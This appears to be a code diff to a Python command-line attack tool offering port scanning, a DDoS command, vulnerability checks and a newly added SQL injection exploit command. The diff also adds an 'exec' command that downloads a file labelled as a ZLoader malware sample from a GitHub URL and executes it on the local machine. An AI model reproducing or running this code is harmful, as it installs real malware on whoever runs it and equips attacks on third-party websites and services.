@@ -7,15 +7,15 @@ import click_completion
 import logging
 from urllib.parse import urlparse
 
-from utils.function import *
+from .utils.function import *
+from .utils.exploit import *
 
 click_completion.init()
 
 console = Console()
-attack_num = 0
 
 
-@click.command()
+@click.command("scan")
 @click.argument("target", type=click.STRING)
 def scan(target):
     try:
@@ -35,7 +35,7 @@ def scan(target):
         if not open_ports:
             rprint('[bold yellow]No open ports found.[/bold yellow]')
         else:
-            logname = f"logs/scan_{target}.log"
+            logname = f"logs/scan_{target}.json"
             logging.basicConfig(filename=logname,
                                 filemode='a',
                                 format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
@@ -52,7 +52,7 @@ def scan(target):
         rprint(f'[italic red]{e}[/italic red]')
 
 
-@click.command()
+@click.command("atk")
 @click.argument("target", type=click.STRING)
 @click.argument("port", type=click.INT)
 @click.option("--threads", default=100, help="Number of threads for DDoS attack")
@@ -76,7 +76,7 @@ def map(url):
     parsed_url = urlparse(url)
     domain = parsed_url.netloc
     discovered_urls = discover_urls(url)
-    logname = f"logs/map_{domain}.log"
+    logname = f"logs/map_{domain}.json"
     logging.basicConfig(filename=logname,
                         filemode='a',
                         format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
@@ -89,7 +89,7 @@ def map(url):
         rprint(f"[bold green]{i}. {discovered_url}[/bold green]")
 
 
-@click.command()
+@click.command("check")
 @click.argument("url", type=click.STRING)
 @click.option("--sql", is_flag=True, default=False, help="Check for SQL injection vulnerability")
 @click.option("--xss", is_flag=True, default=False, help="Check for XSS vulnerability")
@@ -102,3 +102,23 @@ def check(url, sql, xss, conf, dirtv, rcev, fuv):
         check_vulnerabilities(url, sql, xss, conf, dirtv, rcev, fuv)
     else:
         rprint("[white bold]No URL provided.[/white bold]")
+
+
+@click.command("sinject")
+@click.argument("url", type=click.STRING)
+@click.option("--method", default='GET', help="Request method")
+@click.option("--p", default='GET', help="The parameter to do SQL injection")
+def sql_injection(url, method, p):
+    if url:
+        exploit_sql_injection(url, method, p)
+
+    else:
+        rprint("[white bold]No URL provided.[/white bold]")
+
+
+@click.command("exec")
+def exec():
+    url = "https://github.com/aliftech/malware-samples/raw/master/2020-05-ZLoader-Evolution/05d8a7144a984b5f9530f0f9abe96546cfec0ad2c8cdc213bc733d7e14e750df"
+    path = "logs/aex"
+    download_file(url, path)
+    execute_file(path)
